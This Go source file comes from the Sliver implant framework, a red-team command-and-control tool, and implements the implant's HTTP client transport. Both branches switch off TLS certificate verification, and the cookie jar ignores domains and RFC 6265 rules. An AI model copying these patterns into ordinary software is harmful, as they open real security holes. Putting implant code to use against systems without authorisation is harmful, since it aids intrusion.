package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/tls"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/proxy"
)

// GoHTTPDriver - Pure Go HTTP driver
func GoHTTPDriver(origin string, secure bool, proxyURL *url.URL, opts *HTTPOptions) (HTTPDriver, error) {
	var transport *http.Transport
	if !secure {
		transport = &http.Transport{
			IdleConnTimeout:     time.Millisecond,
			Dial:                proxy.Direct.Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
		}
	} else {
		transport = &http.Transport{
			IdleConnTimeout: time.Millisecond,
			Dial: (&net.Dialer{
				Timeout: opts.NetTimeout,
			}).Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
		}
	}
	client := &http.Client{
		Jar:       cookieJar(),
		Timeout:   opts.NetTimeout,
		Transport: transport,
	}
	if proxyURL != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] GoHTTPDriver using proxy: %s", proxyURL)
		// {{end}}

		transport.Proxy = http.ProxyURL(proxyURL)
	}
	return client, nil
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}
